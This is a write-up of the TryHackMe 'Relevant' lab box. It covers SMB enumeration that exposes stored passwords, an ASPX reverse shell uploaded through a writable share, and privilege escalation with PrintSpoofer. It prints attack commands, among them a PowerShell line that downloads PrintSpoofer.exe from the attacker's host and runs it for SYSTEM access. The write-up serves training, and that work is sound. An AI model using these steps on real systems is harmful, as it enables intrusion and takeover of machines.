---
layout: solution
category: TryHackMe
contest_code: Offensive_Pentesting
contest_name: Offensive Pentesting
problem_code: RELEVANT
problem_name: Relevant
comments: false
tags: windows smb SeImpersonatePrivilege
date: 2022-02-02
---

### Rust Scan scanning tool was used to enumerate the running services on the server. From the ports that look open, it looks like this is a windows machine. This is confirmed with the Nmap results we got

### We can also see that web service is running on ports 80 and 49663

![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Relevant/rustscan1.png)

![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Relevant/rustscan2.png)

![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Relevant/rustscan3.png)


‎

### I first moved on to SMB enumeration where I noticed I was able to access a drive that stored user passwords

![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Relevant/smb_enum.png)

<p style="color:orange;">Viewing and decoding the passwords</p>

![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Relevant/passwords.png)


‎

### With the passwords I got, I tried to RDP my way through, but it failed which got me thinking about whether I was missing something. Then I tried to perform more enumeration using RPC which I found something interesting

### When tried for user Bill, it's giving me access denied. There is a possibility that user Bill doesn't exist. User Bob existed however it seems that I'm not getting any information when I'm supposed to

```
rpcclient -U "bill" 10.10.6.14
```

![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Relevant/rpcclient.png)


‎

### In the end, I decided to use Pxexec. It then, help me confirm a few queries I had. User Bill does not exist

```
psexec bill@10.10.6.14
```

![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Relevant/psexec1.png)

<p style="color:orange;">This path might be either a red herring or a honeypot infrastructure because I am unable to get a successful connection</p>

![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Relevant/psexec2.png)


‎

### I decided to look at the HTTP sites. On both ports 80 & 49663, they are showing me the same thing

![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Relevant/web1.png)

![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Relevant/web2.png)


‎

### I decided to run Gobuster to retrieve hidden pages which got me something interesting. Seems like there is a path `nt4wrksv` on 49663 but not on port 80. This pathname is also the name of the accessible SMB Share

```
gobuster dir -t 100 -u http://10.10.6.14:49663 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Relevant/gobuster.png)

![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Relevant/gobuster_found.png)

<p style="color:orange;">I confirmed that this is an SMB share too because I was able to access passwords.txt</p>

![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Relevant/web_smb.png)


‎

### Since anonymous users have write permissions to the `nt4wrksv` SMB share, I used an ASPX shell which I found [here](https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx). I uploaded it through SMB and executed it through the web server, giving me a reverse shell

![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Relevant/smbclient.png)

![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Relevant/shell.png)


‎

### I did some enumeration by running `whoami /priv` and turns out SeImpersonatePrivilege is enabled

![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Relevant/whoami.png)


‎

### I then attempted to use Juicy potato however it failed probably because DCOM is disabled or doesn't work for this OS version. More information can be found here on [Juicy Potato](https://ohpe.it/juicy-potato/)

### There is another exploit we can use called PrintSpoofer. It attempts to impersonate users using names Pipes. There is more in-depth detail on how this exploit works [here](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)

### So I downloaded this tool and hosted it on my python webserver

![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Relevant/python_web.png)

<p style="color:orange;">I then downloaded it on the vulnerable machine from the attacker's machine. When executed, I got System privileges </p>

```
powershell wget http://10.11.21.149:8000/PrintSpoofer.exe -Outfile PrintSpoofer.exe
PrintSpoofer.exe -i -c cmd.exe</p>
```

![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Relevant/priv_escal.png)
